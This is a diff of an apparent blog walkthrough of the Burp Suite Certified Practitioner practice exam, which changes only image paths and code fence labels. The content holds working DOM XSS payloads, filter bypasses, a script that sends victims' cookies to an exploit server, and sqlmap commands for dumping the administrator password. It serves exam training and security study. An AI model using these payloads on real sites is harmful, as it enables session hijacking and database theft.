@@ -17,7 +17,7 @@ PortSwigger has introduced the **Burp Suite Certified Practitioner** accreditati
 
 The Burp Suite Certified Practitioner exam costs **$99** and you will need to have an **active subscription** to Burp Suite Professional. You can get certified by using only this 3 steps.
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/burp_step_certs.PNG)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/burp_step_certs.PNG)
 
 Also, if you pass the exam before 15 Dec they will **refund** your $99!
 
@@ -39,25 +39,25 @@ Before we go through the practice exam, there are few things to take notes.
 
 When we open the challenge, we can see there is a search function. You can try with a simple payload to check different vulnerabilities such as `single quote (')`, XSS payload or etc. When we try put for example `test123` and view the Burp HTTP history, we can see also `searchResults.js` been requested.
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/burp_found_js.png)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/burp_found_js.png)
 
 From here, we can see inside the javascript there is `eval` function been used.
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/burp_found_eval.png)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/burp_found_eval.png)
 
 Thanks to [@r00tpgp](https://www.r00tpgp.com/2021/08/burp-suite-certified-practitioner-exam.html) blog, I learn something new. We can use this Chrome extension to easily discover and test inputs passed into sinks that could lead to **DOM XSS vulnerabilities**.
 
 - [Untrusted Types For DevTools](https://chrome.google.com/webstore/detail/untrusted-types-for-devto/bpeblffgmddnafmnmdjohcmkbeifdlnb?hl=en)
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/chrome_extension_untrusted.PNG)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/chrome_extension_untrusted.PNG)
 
 When we search something again, we could see this in our **console**.
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/console_js.png)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/console_js.png)
 
 Here are payloads that will works:
 
-~~~js
+~~~
 "-alert(1)-"
 \\"-alert(1)}//
 "-alert(1)}//
@@ -65,17 +65,17 @@ Here are payloads that will works:
 
 Now, let's create a payload to alert cookies. 
 
-~~~js
+~~~
 "-alert(document.cookie)-"
 ~~~
 
 We notice that it will get blocked.
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/payload_blocked.png)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/payload_blocked.png)
 
 Using global variables, we can bypass it.
 
-~~~js
+~~~
 "-alert(window["document"]["cookie"])-"
 "-window["alert"](window["document"]["cookie"])-"
 "-self["alert"](self["document"]["cookie"])-"
@@ -83,25 +83,25 @@ Using global variables, we can bypass it.
 
 Let's create another payload to test before send to our exploit server. But, this will also get blocked.
 
-~~~js
+~~~
 "-(window["document"]["location"]="https://<CHANGE_HERE>.web-security-academy.net/?"+window["document"]["cookie"])-"
 ~~~
 
 By replacing `.` with `%2e` we are able to bypass it.
 
-~~~js
+~~~
 "-(window["document"]["location"]="https://<CHANGE_HERE>%2eweb-security-academy%2enet/?"+window["document"]["cookie"])-"
 ~~~
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/cyberchef_urlencode_1.png)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/cyberchef_urlencode_1.png)
 
 We can see our **session key** in log.
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/session_log.png)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/session_log.png)
 
 When we try to use the first payload **(Before URL Encode)**, it doesn't work. After we use the second payload **(After URL Encode)**, it seems to work now. You can use [CyberChef](https://gchq.github.io/CyberChef/) as it easy to use.
 
-~~~js
+~~~
 # Before URL Encode
 <script>
 location='https://<CHANGE_HERE>.web-security-academy.net/?find="-(window["document"]["location"]="https://<CHANGE_HERE>>%2eweb-security-academy%2enet/?"+window["document"]["cookie"])-"';
@@ -113,34 +113,34 @@ location='https://<CHANGE_HERE>.web-security-academy.net/?find=%22%2D%28window%5
 </script>
 ~~~
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/cyberchef_urlencode_2.png)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/cyberchef_urlencode_2.png)
 
 Nice! We got the session cookie **(Carlos)** in our log.
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/session_log_2.png)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/session_log_2.png)
 
 Change the session cookie and we will get login as **Carlos**!
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/carlos_login.png)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/carlos_login.png)
 
 
 #### Walkthrough 2/3
 
 There is new features `Advanced Search` that we could access using **Carlos** account.
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/advanced_search.png)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/advanced_search.png)
 
 By inserting `single quote (')` on the second parameter it will give us SQL Error **(PostgreSQL)**.
 
-~~~bash
+~~~
 https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by='&writer=
 ~~~
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/sql_error.png)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/sql_error.png)
 
 Since we know the parameter that vulnerable to **SQLi**, we can now use **SQLMap**.
 
-~~~bash
+~~~
 (1)
 python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" --batch
 
@@ -156,11 +156,11 @@ python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsear
 
 We will then be able to dump the `users` tables and get the `administrator` password!
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/sqlmap_output.png)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/sqlmap_output.png)
 
 Login as `administrator` and delete **Carlos** account to complete the second (2) stage.
 
-![](https://github.com/H0j3n/H0j3n.github.io/raw/master/assets/uploads/burp/deleted_carlos.png)
+![](https://github.com/H0j3n/H0j3n.github.io/assets/img/uploads/1_burp/deleted_carlos.png)
 
 If you want to use **SQLMap** in Windows, make sure you have **Python2/Python3** and download the `zip` file from [here](https://sqlmap.org/)
 
